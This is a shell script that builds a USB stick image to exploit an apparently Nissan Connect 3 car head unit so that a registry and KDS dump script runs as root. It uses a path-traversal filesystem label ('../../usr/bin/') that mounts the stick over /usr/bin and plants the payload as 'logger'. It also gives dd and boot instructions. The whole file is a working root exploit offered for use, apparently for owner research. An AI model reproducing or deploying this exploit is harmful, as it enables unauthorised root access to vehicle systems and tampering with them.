#!/bin/sh
# Build the USB stick image for regdump_logger.sh (registry/KDS extractor).
# Same exploit layout as nissan_connect3_map_conv/diag/rootshellfs_navdiag.sh:
#   ext2 label "../../usr/bin/"  -> stick mounts over /usr/bin
#   script copied as `logger`     -> executed as root when the system calls `logger`
#
# Usage:  ./build_regdump_stick.sh          -> regdump.ext2 (next to this script)
# Then:   sudo dd if=regdump.ext2 of=/dev/sdX bs=4M status=progress
# Boot the car with the stick inserted (map SD as usual). When the HU reboots
# by itself, the data is on the stick under ./regdump/.
#
# Requires e2fsprogs (mke2fs) + e2tools (e2cp). Fallback: mount loop + cp.

set -e
cd "$(dirname "$0")"

SIZE_KB=131072   # 128 MB
IMG=regdump.ext2
SRC=regdump_logger.sh

rm -f "./$IMG"
dd if=/dev/zero of="./$IMG" bs=1024 count="$SIZE_KB" status=none
mke2fs -q -F "$IMG" \
    -U 00000000-0000-0000-0000-000000000000 \
    -L "../../usr/bin/"

e2cp -P 777 "$SRC" "$IMG":/logger

echo "======================================"
echo "regdump stick image ready: $IMG"
echo "  dd if=./$IMG of=/dev/sdX bs=4M   (careful with sdX!)"
echo "  insert into the HU cold, start ignition, wait for the auto-reboot,"
echo "  then pull the stick. Results: ./regdump/ on the stick."
echo "======================================"